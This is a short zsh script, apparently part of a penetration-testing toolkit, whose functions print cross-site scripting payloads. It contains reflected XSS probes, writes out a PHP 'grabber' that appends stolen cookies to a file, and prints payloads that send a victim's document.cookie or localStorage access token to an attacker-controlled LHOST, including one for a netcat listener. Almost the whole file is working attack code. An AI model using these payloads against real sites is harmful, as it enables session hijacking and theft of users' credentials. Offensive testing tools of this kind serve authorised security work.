#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-xss
#############################################################

qq-enum-xss-reflected() {
echo $(cat << END 

<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>

END
)
}

qq-enum-web-xss-exfil-grabber-generate() {
cat <<'EOF' | tee grabber.php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>
EOF
}

qq-enum-web-xss-exfil-grabber-payloads(){
    __GET-LHOST
echo $(cat << END 
<script>document.location='http://${__LHOST}/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://${__LHOST}/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
END
)
}

qq-enum-web-xss-exfil-cookie-netcat() {
    __GET-LHOST
    __warn "Start a netcat listener on port 80"
    echo "<script> new Image().src=\"http://${__LHOST}/page?var=\"+document.cookie; </script>" 
}

